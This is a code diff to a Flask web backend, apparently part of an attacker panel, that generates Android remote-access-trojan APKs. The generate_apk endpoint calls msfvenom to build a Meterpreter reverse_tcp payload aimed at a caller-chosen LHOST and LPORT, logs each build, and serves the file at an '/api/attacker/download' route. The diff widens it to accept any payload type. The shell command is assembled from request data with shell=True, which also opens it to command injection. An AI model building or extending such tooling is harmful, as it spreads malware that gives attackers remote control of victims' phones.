@@ -3,6 +3,7 @@ import os
 import json
 import subprocess
 import docker
+import uuid
 from datetime import datetime
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
@@ -24,11 +25,12 @@ os.makedirs(UPLOADS_DIR, exist_ok=True)
 # Models
 class APKPayload(db.Model):
     __tablename__ = 'apk_payloads'
-    id = db.Column(db.Integer, primary_key=True)
+    id = db.Column(db.String(255), primary_key=True)
+    filename = db.Column(db.String(255))
     lhost = db.Column(db.String(255))
-    lport = db.Column(db.Integer)
-    payload_name = db.Column(db.String(255))
-    file_path = db.Column(db.String(255))
+    lport = db.Column(db.String(255))
+    payload_type = db.Column(db.String(255))
+    output_path = db.Column(db.String(255))
     status = db.Column(db.String(50), default='pending')
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
@@ -61,13 +63,14 @@ def generate_apk():
     try:
         data = request.json
         lhost = data.get('lhost', LHOST)
-        lport = int(data.get('lport', 4444))
-        payload_name = f"android_rat_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+        lport = str(data.get('lport', 4444))
+        payload_type = data.get('payload_type', 'android/meterpreter/reverse_tcp')
+        filename = f"android_rat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.apk"
 
-        output_path = os.path.join(UPLOADS_DIR, f"{payload_name}.apk")
+        output_path = os.path.join(UPLOADS_DIR, filename)
 
         # Try msfvenom, fallback to mock APK for testing
-        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_path}"
+        cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -o {output_path}"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
 
         if result.returncode != 0:
@@ -78,11 +81,14 @@ def generate_apk():
         else:
             success = True
 
+        payload_id = str(uuid.uuid4())
         apk = APKPayload(
+            id=payload_id,
+            filename=filename,
             lhost=lhost,
             lport=lport,
-            payload_name=payload_name,
-            file_path=output_path,
+            payload_type=payload_type,
+            output_path=output_path,
             status='completed' if success else 'failed'
         )
         db.session.add(apk)
@@ -90,9 +96,9 @@ def generate_apk():
 
         return jsonify({
             'success': success,
-            'payload_id': apk.id,
-            'payload_name': payload_name,
-            'file_path': output_path,
+            'payload_id': payload_id,
+            'filename': filename,
+            'output_path': output_path,
             'output': result.stdout,
             'error': result.stderr if result.returncode != 0 else 'Using mock APK for testing'
         }), 200
@@ -105,12 +111,13 @@ def get_apk_history():
         apks = APKPayload.query.all()
         return jsonify([{
             'id': apk.id,
-            'payload_name': apk.payload_name,
+            'filename': apk.filename,
             'lhost': apk.lhost,
             'lport': apk.lport,
+            'payload_type': apk.payload_type,
             'status': apk.status,
             'created_at': apk.created_at.isoformat(),
-            'file_path': apk.file_path
+            'output_path': apk.output_path
         } for apk in apks]), 200
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
@@ -130,14 +137,14 @@ def get_sessions():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/attacker/download/<int:apk_id>', methods=['GET'])
+@app.route('/api/attacker/download/<apk_id>', methods=['GET'])
 def download_apk(apk_id):
     try:
         apk = APKPayload.query.get(apk_id)
-        if not apk or not os.path.exists(apk.file_path):
+        if not apk or not os.path.exists(apk.output_path):
             return jsonify({'error': 'APK not found'}), 404
 
-        return send_file(apk.file_path, as_attachment=True, download_name=f"{apk.payload_name}.apk")
+        return send_file(apk.output_path, as_attachment=True, download_name=apk.filename)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
